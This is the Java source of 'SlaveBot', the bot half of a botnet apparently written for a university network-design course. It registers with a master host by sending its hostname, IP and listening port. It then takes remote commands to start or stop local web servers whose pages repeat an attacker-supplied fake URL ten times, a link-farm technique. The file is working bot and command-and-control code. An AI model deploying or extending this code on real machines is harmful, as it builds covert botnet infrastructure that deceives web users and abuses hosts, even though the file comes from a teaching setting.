/*
@author Vishal Govindraddi Yarabandi
        CMPE-206-Network Design Course Project under Dr.Juan Gomez
        San Jose State University
        SlaveBot

@usage java SlaveBot -h <Master-HostNameOrIP> -p <Port>

*/

import java.net.*;
import java.io.*;
import java.lang.*;
import java.util.*;
import java.text.SimpleDateFormat;

class FakeWebServer implements Runnable { //Class to connect to Target Host-Multithreaded
    private Thread th;
    private String threadName;
    public String fakeWeb;
    public Integer port;

    FakeWebServer(String Port, String fakeURL) {
        threadName = "webServer_" + Port;
        fakeWeb = fakeURL;
        port = Integer.parseInt(Port);
    }
    public void sendIndexPage(PrintWriter client){
        client.print("HTTP/1.0 200 OK\r\n"); // Version & status code
        client.print("Content-Type: text/html\r\n"); // The type of data
        client.print("\r\n"); // End of headers
        client.print("<HTML><body><p>Vishal Yarabandi here, just testing.</p>\r\n");
        client.print("<br></br>\r\n");
        client.print("<a href=\"http://localhost:" + Integer.toString(port) + "/mypage1.html\">Breaking News</a>\r\n");
        client.print("<a href=\"http://localhost:" + Integer.toString(port) + "/mypage2.html\">Breaking News</a>\r\n");
        client.print("<br></br>\r\n");

        for(int i = 0; i < 10; i++){
            client.print("<a href="+fakeWeb+">Check this out!!</a>\r\n"); //Dumping fake URL 10 times here!
        }
        client.print("</body></HTML>\r\n\r\n");
    }

    public void sendSecondPage(PrintWriter client){
        client.print("HTTP/1.1 200 OK\r\n"); // Version & status code
        client.print("Content-Type: text/html\r\n"); // The type of data
        client.print("\r\n"); // End of headers
        client.print("<HTML><body><p>Vishal Yarabandi here, just testing.</p>\r\n");
        client.print("<br></br>\r\n");
        client.print("<a href=\"http://localhost:" + Integer.toString(port) + "/mypage3.html\">Breaking News</a>\r\n");
        client.print("<a href=\"http://localhost:" + Integer.toString(port) + "/mypage4.html\">Breaking News</a>\r\n");
        client.print("<br></br>\r\n");

        for(int i = 0; i < 10; i++){
            client.print("<a href="+fakeWeb+">Check this out!!</a>\r\n"); //Dumping fake URL 10 times here!
        }
        client.print("</body></HTML>\r\n\r\n");
    }

    public void sendThirdPage(PrintWriter client){
        client.print("HTTP/1.1 200 OK\r\n"); // Version & status code
        client.print("Content-Type: text/html\r\n"); // The type of data
        client.print("\r\n"); // End of headers
        client.print("<HTML><body><p> Vishal Yarabandi here, just testing.</p>\r\n");
        client.print("<br></br>\r\n");
        //client.print("<a href=\"http://localhost:" + Integer.toString(port) + "/mypage1.html>Breaking News</a>\r\n");
        //client.print("<a href=\"http://localhost:" + Integer.toString(port) + "/mypage2.html>Breaking News</a>\r\n");
        client.print("<br></br>\r\n");
        
        for(int i = 0; i < 10; i++){
            client.print("<a href="+fakeWeb+">Check this out!!</a>\r\n");  //Dumping fake URL 10 times here!
        }
        client.print("</body></HTML>\r\n\r\n");
    }

    public void sendNotFound(PrintWriter client){
        client.print("HTTP/1.1 401 Not Found\r\n"); // Version & status code
        client.print("\r\n"); // End of headers
    }

    @Override
    public void run() {
        try {
                ServerSocket ss = new ServerSocket(port);
                Socket client = null;
                // Create a ServerSocket to listen on that port.
                // Now enter an infinite loop, waiting for & handling connections.
                while(true) {
                    // Wait for a client to connect. The method will block;
                    // when it returns the socket will be connected to the client
                    try{
                        client = ss.accept();
                    }catch(SocketException ex){
                        return;
                    }

                    // Get input and output streams to talk to the client
                    BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
                    PrintWriter out = new PrintWriter(client.getOutputStream());

                    // Start sending our reply, using the HTTP 1.1 protocol

                    String line;
                    if((line = in.readLine()) != null) {
                        if (line.length() == 0){
                            out.close();
                            in.close();
                            client.close();
                            continue;
                        }
                        //System.out.println(line);
                        String[] parts = line.split(" ");
                        String file = parts[1];
                        if(parts[0].equals("down")){
                            if(port == Integer.parseInt(parts[1]) || fakeWeb.equals(parts[2])){
                                 ss.close();
                                 return;
                              }
                        }
                        else if (parts[0].equals("GET") && parts[2].indexOf("HTTP") != -1){
                            if(file.equals("/") || file.equals("/index.html")){
                                sendIndexPage(out);
                            }
                            else if(file.equals("/mypage1.html") || file.equals("/mypage2.html")){
                                sendSecondPage(out);
                            }
                            else if(file.equals("/mypage3.html") || file.equals("/mypage4.html")){
                                sendThirdPage(out);
                            }
                            else{
                                sendNotFound(out);
                            }
                        }
                    }
                    out.close(); // Flush and close the output stream
                    in.close(); // Close the input stream
                    client.close(); // Close the socket itself
                } // Now loop again, waiting for the next connection
        }

        catch(IOException ex) { 
            //System.err.println("Run: " + ex.getMessage());
            //System.exit(-1);
        }
    }

    public void start() {
        if (th == null) {
            th = new Thread(this,threadName);
            th.start();
        }
    }
}

public class SlaveBot { 
    public static void riseFakeWeb(String Port, String fakeURL) {
        if(Port == null || fakeURL == null) {
                return; 
        }
        FakeWebServer connection = new FakeWebServer(Port, fakeURL);
        connection.start();
    }

    public static void downFakeWeb(String Port, String fakeURL) {
        if (Port == null || fakeURL == null) {
                return;
        }
        try{
            Socket sock = new Socket("localhost", Integer.parseInt(Port));
            PrintWriter  web = new PrintWriter(sock.getOutputStream(),true);
            web.println("down"+ " "  + Port + " " + fakeURL);
            web.close();
            sock.close();
       }
       catch(IOException ex){}
    }

    public static void register(String[] args, int Port) { //Register with master
        try {
            InetAddress address = InetAddress.getLocalHost();
            String selfHostIP = address.getHostAddress();
            String selfHostName = address.getHostName();

            Socket masterSock = new Socket(args[1], Integer.parseInt(args[3]));				    
            PrintWriter  masterOutStream = new PrintWriter(masterSock.getOutputStream(),true);

            String timeStamp = new SimpleDateFormat("yyyy-MM-dd").format(Calendar.getInstance().getTime());
            masterOutStream.println(selfHostName + " " + selfHostIP + " " + Integer.toString(Port) + " " + timeStamp);

            masterSock.close();
        }
        catch(IOException ex) {
            //System.err.println("Could not register with master!  " + ex.getMessage());
            //System.exit(-1);
        }
    }

    public static void main(String[] args) {   
        if (args.length != 4) {    //check if -h MasterBot-IP -p port is given
            System.exit(-1);
        }

        int listenerPort;
        Random rand = new Random();                          //select a random port number for slave to listen for master commands
        listenerPort = rand.nextInt((65535 - 49152) + 1) + 49152;

        register(args, listenerPort);                   //register self with Master

        try( ServerSocket slave = new ServerSocket(listenerPort);) {
            while(true) {          //listen for connection from master
                Socket masterCon = slave.accept();
                try {
    		    InputStream cmdIn = masterCon.getInputStream(); // create object to get input through socket
                    BufferedReader br = new BufferedReader(new InputStreamReader(cmdIn));  //stores input until master closes the connection
                    String line = br.readLine();
                    String[] cmd = line.split("\\s+");

                    if("rise-fake-url".equals(cmd[0])) {
                        riseFakeWeb(cmd[1], cmd[2]);
                    }
                    if("down-fake-url".equals(cmd[0])) {
                        downFakeWeb(cmd[1], cmd[2]);
                    }
                }
                catch(IOException ex) {
                    //System.err.println("Main-while: " + ex.getMessage());
                    //System.exit(-1);
                }
                masterCon.close();
            }
        } 
        catch (IOException ex) {
            //System.err.println("Main: " + ex.getMessage());
            System.exit(-1);
        }
    }
}
